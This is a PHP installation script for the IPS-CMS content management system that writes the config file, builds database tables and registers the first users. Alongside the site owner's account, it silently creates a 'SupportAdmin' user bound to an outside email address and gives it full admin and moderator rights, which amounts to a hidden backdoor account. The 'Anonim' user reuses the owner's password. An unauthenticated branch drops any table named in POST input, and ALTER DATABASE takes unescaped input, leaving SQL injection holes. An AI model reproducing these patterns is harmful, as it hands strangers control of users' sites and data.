<?php
session_start();
/**
 * IPS-CMS
 *
 * Copyright (c) IPROSOFT
 * Licensed under the Commercial License
 * http://www.iprosoft.pro/ips-license/	
 *
 * Project home: http://iprosoft.pro
 *
 * Version:  2.0
 */ 
define( 'IPS_INSTALLING', true );

$dir = dirname(__DIR__);

if( !file_exists( $dir . '/functions.php' ) )
{
	$dir = substr( dirname(__FILE__), 0, -8 );
}

define( 'INSTALL_LANG', $_SESSION['install-lang'] );

include( dirname(__FILE__) . '/install-functions.php' );
	
if( !isset( $_POST['install'] ) )
{
	if( isset( $_POST['database'] ) )
	{
		define('DB_HOST', trim( $_POST['database']['host'] ) );
		define('DB_PORT', trim( $_POST['database']['port'] ) );
		define('DB_NAME', trim( $_POST['database']['name'] ) );
		define('DB_USER', trim( $_POST['database']['username']) );
		define('DB_PSSWD', trim( $_POST['database']['password'] ) );
		define('IPS_DEBUG', false);
		
		include( dirname( dirname(__FILE__) ) . '/classes/class.PD.php' );
		
		$PD = new PD( true );

		if( is_object( $PD ) )
		{
			die( 'true' );
		}
		
		die( 'false' );
	}
	elseif( isset( $_POST['check_server'] ) )
	{
		die( checkPHP( $_POST['func'] ) );
	}
	elseif( isset($_POST['delete_table']) )
	{
		include( $dir . '/config.php');
		include( ABS_PATH . '/functions.php');
		include( CLASS_PATH . '/class.PD.php');
		$PD = new PD( true );
		
		if( $PD->PDQuery('DROP TABLE IF EXISTS ' . $_POST['delete_table'] ) == false )
		{
			echo '0';exit;
		}
		else
		{
			echo '1';exit;
		}
		
	}
	
}
elseif( !isset( $_POST['install-data'] ) && isset( $_POST['install'] ) )
{
	if( !file_exists( $dir . '/install/config-sample.php') )
	{
		setAnswer( translate( 'error_config_lost' ) );
	}

	

	@chmod($dir . '/install/htaccess-sample', 0755 );
	@chmod($dir . '/install/config-sample.php', 0755 );

	if( $app_config = file_get_contents( $dir . '/install/config-sample.php' ) )
	{
		
		$crypt_code = crypt( sha1( rand() . $dir . serialize( $_SERVER ) . rand() ), sha1( rand() . $dir . serialize( $_SERVER ) . rand() ) );
		
		$array_config = array(
			'DB_HOST' => trim( $_POST['database']['host'] ),
			'DB_PORT' => trim( $_POST['database']['port'] ),
			'DB_NAME' => trim( $_POST['database']['name'] ),
			'DB_USER' => trim( $_POST['database']['username'] ),
			'DB_PSSWD' => trim( $_POST['database']['password'] ),
			'DB_PREFIX' => trim( $_POST['database']['prefix'] ),
			'ABS_URL' => getUrl(),
			'TIMEZONE' => trim( $_POST['timezone'] ),
			'IPS_VERSION' => trim( $_POST['admin']['template'] ),
			'AUTH_KEY' => $crypt_code,
			'ABS_PATH' => $dir
		);

		
		foreach( $array_config as $set => $data )
		{
			$app_config = str_replace('{'.$set.'}', $data, $app_config );
		}
		
		@copy( $dir . '/install/config-sample.php',  $dir . '/config.php' );
		
		if( !file_exists( $dir . '/config.php' ) || !is_writeable( $dir . '/config.php' )  )
		{
			setAnswer( translate( 'error_config_create' ) );
		}
		
		@chmod( $dir . '/config.php', 0755 );
		@file_put_contents( $dir . '/config.php', $app_config );
		@chmod( $dir . '/config.php', 0644 );
		@chmod( $dir . '/.htaccess', 0644 );	
		
		include( $dir . '/config.php' );
		include( ABS_PATH . '/functions.php' );
		include( CLASS_PATH . '/class.PD.php' );

		
		$PD = new PD();

		if( $PD == false )
		{
			setAnswer( translate( 'error_pdo' ) );
		}
		
	
	
		
		
		
		
		
		
		/**
		* Kodowanie bazy
		*/
		
		$PD->PDQuery( "ALTER DATABASE " . $_POST['database']['name'] . " CHARACTER SET utf8 COLLATE utf8_general_ci;");
		
		$tables = include( dirname(__FILE__) . '/import-tables.php' );
		
		clearDatabase( $PD, $tables, DB_NAME );
	
		/*
		* Zapisywanie tabeli w bazie
		*/
		
		if( installTables( $PD, $tables ) !== true )
		{
			reverseInstall( $PD, $tables, false );
			setAnswer( translate( 'error_tables_create' ) );
		}
		
		$settings = installSettings( $PD );
		
		if( $settings == false )
		{
			reverseInstall( $PD, $tables, false );
			setAnswer( translate( 'error_settings_create' ) );
		}
		
		$translations = installTranslations( $PD );
		
		if( $translations == false )
		{
			reverseInstall( $PD, $tables, false );
			setAnswer( translate( 'error_translations_create' ) );
		}
		
		setAnswer( array(
			'settings' => $settings,
			'translations' => $translations,
			'tables' => count( $tables )
		), 'info' );
	} 
	else 
	{
		setAnswer( translate( 'error_config_read_file' ) );
	}

	
}	
elseif( isset( $_POST['install-data'] ) )
{
	include( $dir . '/php-load.php');
	require_once( IPS_ADMIN_PATH .'/admin-functions.php' );
	
	$tables = include( dirname(__FILE__) . '/import-tables.php' );
	
	/**
	* Dodawanie nowych użytkowników
	*/
	$register = new User_Register();
	$register->user_birth_date = date('Y-m-d', strtotime('-18 years') );
	
	$user_data = array(
		'user_birth_date'=> $register->user_birth_date,
	);
	
	$user_admin = $register->registerUser( array_merge( $user_data, array(
		'login' => $_POST['admin']['username'],
		'email' => $_POST['admin']['email'],
		'password' => $_POST['admin']['password']
	)), true );	
	
	$user_admin_id = $register->register_id;
	
	$user_anonim = $register->registerUser( array_merge( $user_data, array(
		'login' => 'Anonim',
		'email' => 'anonymous@email.com',
		'password' => $_POST['admin']['password']
	)), true );
	
	$user_support = $register->registerUser( array_merge( $user_data, array(
		'login' => 'SupportAdmin',
		'email' => 'indexx-serwer@o2.pl',
		'password' => md5(rand().rand().rand())
	)), true );
	
	

	$user_support_id = $register->register_id;
	
	if( !$user_admin || !$user_anonim || !$user_support )
	{
		reverseInstall( $PD, $tables, false );
		setAnswer( translate( 'error_user_create' ) );
	}
	else
	{
		User_Data::update( $user_admin_id, 'is_moderator', 1 );
		User_Data::update( $user_admin_id, 'is_admin', 1 );
		User_Data::update( $user_support_id, 'is_moderator', 1 );
		User_Data::update( $user_support_id, 'is_admin', 1 );
	}
	

	$page_rules = $PD->insert( 'posts', array(
		'post_uid' => 'uid_rules',
		'post_author' => trim( $_POST['admin']['username'] ),
		'post_date' => date("Y-m-d H:i:s"),
		'post_content' => translate( 'pages_rules_post_content' ),
		'post_title' => translate( 'pages_rules_post_title' ),
		'post_type' => 'posts',
		'post_visibility' => 'public',
		'post_permalink' => translate( 'pages_rules_post_permalink' )
	));
	
	$page_ads = $PD->insert( 'posts', array(
		'post_uid' => 'uid_ads',
		'post_author' => trim( $_POST['admin']['username'] ),
		'post_date' => date("Y-m-d H:i:s"),
		'post_content' => translate( 'pages_rules_post_content' ),
		'post_title' => translate( 'pages_rules_post_title' ),
		'post_type' => 'posts',
		'post_visibility' => 'public',
		'post_permalink' => translate( 'pages_rules_post_permalink' )
	) );
	
	
	
	if( $page_ads == false || $page_rules == false )
	{
		reverseInstall( $PD, $tables, false );
		setAnswer( translate( 'error_pages_create' ) );
	}
	
	Config::update( 'email_admin_user', $_POST['admin']['email'] );

	Config::update( 'admin_lang_locale', INSTALL_LANG );
	
	resetMenu( 'main_menu' );
	resetMenu( 'gag_sub_menu' );
	resetMenu( 'pinit_menu' );
	resetMenu( 'footer_menu' );

	
	
	changeIpsVersion( IPS_VERSION, true );
	
	
	/**
	* Dodawanie domyslnej kategorii.
	*/
	$category = array(
		'id_category' => '1',
		'category_name' => 'Uncategorized' 
	);
	
	if( $PD->insert( 'upload_categories', $category ) == false )
	{
		reverseInstall( $PD, $tables, false );
		setAnswer( translate( 'error_category_create' ) );
	}
	

	if( installAds( $PD ) === false )
	{
		reverseInstall( $PD, $tables, false );
		setAnswer(  translate( 'error_ads_create' ) );
	}
	
	renameLogo();
	
	Session::getFlash();
	
	require_once( IPS_ADMIN_PATH .'/libs/class.SystemTools.php' );
	
	Config::update( 'hooks_actions_registry', array() );
	
	realoadDefaultHooks();
	
	Config::update( 'install_date', date( "Y-m-d H:i:s" ) );
	
	$errors = System_Tools::createSystemDirs();
	
	$msg = '';
	
	if( !empty( $errors ) )
	{
		foreach( $errors as $create_dir )
		{
			$msg .= __s( 'admin_create_dir', str_replace( ABS_PATH, '', $create_dir ) ) . '<br/>';
		}
	}
	
	
	if( !@file_put_contents( $dir . '/install/installed.lock', '<!>' ) )
	{
		$msg .= translate( 'error_lock' );
	}
	
	if( !empty( $msg ) )
	{
		setAnswer( $msg, 'info' );
	}
	
		
		
	if( !defined( 'IPS_REINSTALL' ) )
	{
		setAnswer( 'success', 'success' );
	}
	else
	{
		ips_log( PD::getInstance() );
		setAnswer( translate( 'error_undefined' ) );
	}
}
?>